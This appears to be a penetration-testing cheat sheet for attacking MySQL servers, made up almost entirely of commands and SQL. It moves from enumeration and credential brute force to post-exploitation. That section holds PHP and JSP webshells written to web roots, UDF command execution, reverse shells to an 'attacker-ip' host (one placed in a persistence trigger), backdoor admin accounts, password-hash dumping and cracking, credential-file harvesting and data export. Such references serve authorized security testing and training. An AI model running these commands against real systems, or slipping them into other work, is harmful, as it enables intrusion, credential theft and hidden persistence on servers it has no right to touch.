MySQL
Default Port: 3306

MySQL is an open source relational database management system (RDBMS) widely used worldwide. Databases are used to store and manage interrelated data. MySQL is a preferred solution in many areas such as web-based applications, data storage, e-commerce, and log records. SQL (Structured Query Language) is the language MySQL uses to communicate with the database.
```
Connect
Using mysql Client
# Local connection (no password)
mysql -u root

# Local connection with password
mysql -u username -p

# Connect to specific database
mysql -u username -p database_name

# Remote connection
mysql -u username -h target.com -P 3306 -p

# Connect and execute query
mysql -u username -p -e "SELECT @@version;"

# Connect without database selection
mysql -u username -h target.com -p --skip-database
```
```
Using mysqldump
# Dump specific database
mysqldump -u username -p database_name > backup.sql

# Dump all databases
mysqldump -u username -p --all-databases > all_databases.sql

# Dump specific table
mysqldump -u username -p database_name table_name > table.sql

# Remote dump
mysqldump -u username -h target.com -p database_name > remote_backup.sql
```
```
Connection URL Format
mysql://username:password@hostname:port/database_name
mysql://root:password@target.com:3306/app_db

Recon
Service Detection with Nmap
Use Nmap to detect MySQL services and identify server capabilities.

nmap -p 3306 target.com
```
Banner Grabbing
Identify MySQL server version and gather configuration details.
```
Using netcat
# Using netcat
nc -vn target.com 3306

Using nmap
# Using nmap
nmap -p 3306 -sV target.com

Using telnet
# Using telnet
telnet target.com 3306

Enumeration
Version Detection
Once connected to the MySQL server, you can gather version information using built-in SQL functions.

# MySQL version
SELECT @@version;
SELECT VERSION();

# Server information
SELECT @@version_compile_os;
SELECT @@version_compile_machine;

# Detailed version info
SHOW VARIABLES LIKE "%version%";

Database Enumeration
Enumerating databases helps you understand the structure and identify interesting targets for further exploitation.

# List all databases
SHOW DATABASES;
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;

# Current database
SELECT DATABASE();

# Database size
SELECT 
  table_schema AS 'Database',
  ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.TABLES 
GROUP BY table_schema;
```
User Enumeration
Understanding user accounts and their privileges is essential for privilege escalation and lateral movement:
```
# List MySQL users
SELECT user, host FROM mysql.user;

# Current user
SELECT USER();
SELECT CURRENT_USER();

# User privileges
SHOW GRANTS;
SHOW GRANTS FOR 'username'@'host';

# List users with FILE privilege
SELECT user, host FROM mysql.user WHERE File_priv = 'Y';

# List users with SUPER privilege
SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';

Table and Column Enumeration
Discovering tables and columns is crucial for identifying where sensitive data is stored:

# List tables in current database
SHOW TABLES;
SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE();

# List columns in specific table
SHOW COLUMNS FROM table_name;
SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';

# Find sensitive columns
SELECT table_name, column_name FROM information_schema.COLUMNS 
WHERE column_name LIKE '%password%' 
   OR column_name LIKE '%pass%'
   OR column_name LIKE '%pwd%'
   OR column_name LIKE '%secret%'
   OR column_name LIKE '%token%';

# Count rows in tables
SELECT table_name, table_rows FROM information_schema.TABLES 
WHERE table_schema = DATABASE();
```
Privilege Enumeration
Checking user privileges helps identify potential attack vectors and exploitation opportunities:
```
# Check FILE privilege (for LOAD_FILE/INTO OUTFILE)
SELECT file_priv FROM mysql.user WHERE user='current_user';

# Check for dangerous privileges
SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv, 
       Create_priv, Drop_priv, File_priv, Super_priv 
FROM mysql.user;

# Current user permissions
SELECT * FROM information_schema.USER_PRIVILEGES WHERE grantee LIKE '%username%';
```
Configuration Enumeration
Understanding the server configuration can reveal security weaknesses and exploitation opportunities:
```
# Important variables
SHOW VARIABLES;
SHOW VARIABLES LIKE 'secure_file_priv';  # File operations directory
SHOW VARIABLES LIKE 'plugin_dir';        # Plugin directory
SHOW VARIABLES LIKE 'datadir';           # Data directory
SHOW VARIABLES LIKE 'basedir';           # Base directory

# Check if local_infile enabled
SHOW VARIABLES LIKE 'local_infile';

# Process list
SHOW PROCESSLIST;

Metasploit Modules
Metasploit provides various modules for automated MySQL assessment, from version detection to credential dumping:

Detect MySQL Version
use auxiliary/scanner/mysql/mysql_version
set RHOSTS target.com
run

Enumerate Users and Privileges
use auxiliary/admin/mysql/mysql_enum
set RHOSTS target.com
set USERNAME root
set PASSWORD password
run

Dump Database Schema
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS target.com
set USERNAME root
set PASSWORD password
run

Extract Password Hashes
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS target.com
set USERNAME root
set PASSWORD password
run

Brute Force Credentials
use auxiliary/scanner/mysql/mysql_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```
Attack Vectors
Default Credentials
MySQL databases may come with default or well-known accounts that lack strong passwords. Identifying and testing these accounts can provide an initial foothold without resorting to aggressive hacking techniques.
```
mysql -u root -p
```
#enter default or guessable password

Common Credentials
If anonymous login is disabled on the MySQL server, trying common usernames and passwords like admin, administrator , root , user, or test can be a good initial step. This approach is less aggressive than attempting to guess passwords through brute force and is recommended to try first when accessing a server.
```
mysql -u <username> -p
```
#provide a common username
#provide a common password

Bruteforcing Credentials
A brute-force attack involves trying many passwords or usernames to find the right one for accessing a system.

Tools like Hydra are designed for cracking into networks and can be used on services like MySQL, HTTP, SMB, etc. For MySQL, Hydra often carries out a dictionary attack, which means it uses a list of possible usernames and passwords from a file to try and log in.

Bruteforcing with Hydra
To use Hydra for brute-forcing MySQL login credentials, you would use a command structured for this purpose:

hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] mysql://X.X.X.X

Bruteforcing with Nmap
It is also possible to perform brute force on MySQL with Nmap scripts:
```
nmap -p 3306 --script mysql-brute X.X.X.X
```
Bruteforcing with Metasploit
It is also possible to apply brute force with Metasploit modules on MySQL:
```
use auxiliary/scanner/mysql/mysql_login
msf auxiliary(scanner/mysql/mysql_login) > set rhosts X.X.X.X
msf auxiliary(scanner/mysql/mysql_login) > set user_file /path/to/user.txt
msf auxiliary(scanner/mysql/mysql_login) > set pass_file /path/to/pass.txt
msf auxiliary(scanner/mysql/mysql_login) > set stop_on_success true
msf auxiliary(scanner/mysql/mysql_login) > exploit
```
Post-Exploitation
File Operations
MySQL's file operations allow reading and writing files on the server filesystem when FILE privilege is granted:
```
Read Files from Server
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\Windows\\win.ini');
```
# Read file with hex encoding (bypasses binary issues)
```
SELECT HEX(LOAD_FILE('/etc/passwd'));
```

Write Files to Server
```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT 'backdoor content' INTO OUTFILE '/tmp/backdoor.txt';

Check File Operation Restrictions
SHOW VARIABLES LIKE 'secure_file_priv';
```
User Defined Functions (UDF) for RCE
# Create malicious UDF library
# First, create the UDF shared library (compiled C code)
# Then load it into MySQL
```
# Upload UDF library using INTO DUMPFILE
SELECT 0x[hex_encoded_library] INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys_exec.so';

# Create function
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_sys_exec.so';

# Execute commands
SELECT sys_exec('whoami');
SELECT sys_exec('id');
SELECT sys_exec('bash -i >& /dev/tcp/attacker-ip/4444 0>&1');

# Alternative: sys_eval to get output
CREATE FUNCTION sys_eval RETURNS string SONAME 'udf_sys_exec.so';
SELECT sys_eval('cat /etc/passwd');

Webshell Upload
# PHP webshell
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';

# Access: http://target.com/shell.php?cmd=whoami

# More sophisticated webshell
SELECT '<?php
if(isset($_REQUEST["cmd"])){
    $cmd = $_REQUEST["cmd"];
    echo "<pre>";
    $result = shell_exec($cmd);
    echo $result;
    echo "</pre>";
}
?>' INTO OUTFILE '/var/www/html/advanced-shell.php';
```
# JSP webshell (if applicable)
```
SELECT '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' 
INTO OUTFILE '/var/www/html/shell.jsp';
```
Privilege Escalation
# Create new admin user
```
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```
# Modify existing user password
```
UPDATE mysql.user SET password=PASSWORD('newpassword') WHERE user='root';
FLUSH PRIVILEGES;
```
```
# Grant FILE privilege to user
GRANT FILE ON *.* TO 'username'@'localhost';
FLUSH PRIVILEGES;

Password Hash Extraction
# Extract password hashes (MySQL < 5.7)
SELECT user, password FROM mysql.user;

# Extract password hashes (MySQL >= 5.7)
SELECT user, authentication_string FROM mysql.user;

# Specific user hash
SELECT authentication_string FROM mysql.user WHERE user='root';

# Export hashes to file
SELECT user, authentication_string FROM mysql.user 
INTO OUTFILE '/tmp/hashes.txt';

Hash Cracking
# Extract hashes
mysql -u root -p -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user" > mysql_hashes.txt

# Crack with hashcat (MySQL 4.1/MySQL 5+)
hashcat -m 300 mysql_hashes.txt rockyou.txt

# Crack with John the Ripper
john --format=mysql-sha1 mysql_hashes.txt

# Old MySQL (pre-4.1)
hashcat -m 200 old_mysql_hash.txt rockyou.txt

Data Exfiltration
# Extract sensitive data
SELECT * FROM users WHERE role='admin';
SELECT username, password, email FROM accounts;
SELECT * FROM credit_cards;
SELECT * FROM personal_information;

# Export database to file
SELECT * FROM sensitive_table 
INTO OUTFILE '/tmp/exfiltrated_data.csv'
FIELDS TERMINATED BY ',' 
ENCLOSED BY '"'
LINES TERMINATED BY '\n';

# Concatenate and export
SELECT CONCAT(username, ':', password) FROM users 
INTO OUTFILE '/tmp/credentials.txt';

Persistence
# Create backdoor user
CREATE USER 'support'@'%' IDENTIFIED BY 'SupportP@ss123!';
GRANT ALL PRIVILEGES ON *.* TO 'support'@'%';
FLUSH PRIVILEGES;

# Create stored procedure backdoor
DELIMITER //
CREATE PROCEDURE backdoor()
BEGIN
DECLARE cmd CHAR(255);
DECLARE result TEXT;
SET cmd = 'whoami';
SET result = sys_eval(cmd);
SELECT result;
END //
DELIMITER ;

# Call backdoor
CALL backdoor();

# Create trigger for persistence
CREATE TRIGGER backdoor_trigger
AFTER INSERT ON some_table
FOR EACH ROW
BEGIN
-- Malicious action here
DECLARE result TEXT;
SET result = sys_exec('bash -i >& /dev/tcp/attacker-ip/4444 0>&1');
END;

Credential Harvesting from Files
# Debian MySQL maintenance user
cat /etc/mysql/debian.cnf

# MySQL configuration files
cat /etc/mysql/my.cnf
cat /etc/my.cnf
cat ~/.my.cnf

# Extract hashes from data directory
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD

# MySQL history (may contain passwords)
cat ~/.mysql_history

# Application config files
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /var/www/html/.env

Lateral Movement
# Enumerate network from MySQL
# If UDF is available
SELECT sys_exec('ping -c 1 192.168.1.1');
SELECT sys_exec('nmap -sn 192.168.1.0/24');

# Access other databases if credentials are reused
mysql -h another-host.com -u root -p

# Use extracted credentials on other services
# SSH, RDP, FTP with same credentials

Raptor UDF Exploit
# For Linux systems
# Compile raptor_udf2.c
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Load into MySQL
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/path/to/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select do_system('bash -i >& /dev/tcp/attacker-ip/4444 0>&1');
```
Common MySQL Commands
Command	Description	Usage
SHOW DATABASES;	Lists all databases	SHOW DATABASES;
USE	Switch to database	USE database_name;
SHOW TABLES;	Display all tables	SHOW TABLES;
SELECT	Retrieve data	SELECT * FROM table_name;
INSERT INTO	Insert record	INSERT INTO table (col1) VALUES (val1);
UPDATE	Update records	UPDATE table SET col1=val1 WHERE condition;
DELETE FROM	Delete records	DELETE FROM table WHERE condition;
CREATE USER	Create new user	CREATE USER 'user'@'host' IDENTIFIED BY 'pass';
GRANT	Grant privileges	GRANT ALL ON db.* TO 'user'@'host';
FLUSH PRIVILEGES;	Reload privileges	FLUSH PRIVILEGES;
LOAD_FILE()	Read file	SELECT LOAD_FILE('/etc/passwd');
INTO OUTFILE	Write to file	SELECT * INTO OUTFILE '/tmp/file.txt';
Useful Tools
Tool	Description	Primary Use Case
mysql	Official MySQL client	Direct database access
mysqldump	Database backup tool	Data extraction
Metasploit	Exploitation framework	Automated testing
sqlmap	SQL injection tool	Automated exploitation
Hydra	Password cracker	Brute force attacks
John the Ripper	Password cracker	Hash cracking
hashcat	Password recovery	Advanced hash cracking
